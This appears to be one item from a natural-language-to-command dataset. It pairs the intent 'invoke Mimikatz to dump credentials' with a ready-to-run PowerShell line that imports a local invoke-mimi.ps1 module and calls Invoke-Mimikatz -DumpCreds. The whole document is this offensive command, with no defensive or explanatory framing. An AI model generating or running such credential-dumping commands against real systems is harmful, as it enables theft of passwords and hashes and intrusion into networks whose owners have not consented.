# Natural language intent:
# Import a custom module and invoke Mimikatz to dump credentials

Import-Module .\invoke-mimi.ps1; ; Invoke-Mimikatz -DumpCreds
